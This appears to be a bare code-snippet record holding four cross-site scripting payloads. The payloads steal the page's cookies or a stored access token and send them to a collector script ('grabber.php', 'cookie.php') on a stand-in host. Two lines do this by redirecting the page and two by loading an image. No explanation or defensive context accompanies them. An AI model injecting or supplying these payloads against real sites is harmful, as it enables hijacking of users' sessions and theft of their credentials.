---
id: 4bd40ad7-61b4-4307-af6b-b460f762eedb
type: code
language: HTML
verified: false
created_at: '2023-04-06T03:56:41.637823+00:00'
updated_at: '2023-04-10T20:21:43.600851+00:00'
---

# Code Snippet 4bd40ad7

**Language**: HTML

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```


